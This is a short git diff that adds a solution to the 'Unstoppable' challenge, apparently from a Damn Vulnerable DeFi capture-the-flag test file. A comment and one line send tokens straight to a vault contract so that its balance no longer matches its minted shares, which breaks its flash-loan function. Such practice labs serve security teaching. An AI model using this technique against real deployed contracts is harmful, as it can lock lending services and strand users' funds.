@@ -45,6 +45,11 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        /* transfer DamnValuableToken to vault.address unmath balanceOf() DamnValuableToken's owned by Vault
+           with the amount of asset's minted in vaul in representation of theese DamnValuableToken, bc Vaul mint tokens only
+           depositing by the deposit method in vault, no thorugh transfer's native method in DamnValuableToken */
+        await token.connect(player).transfer(vault.address,10000);
     });
 
     after(async function () {
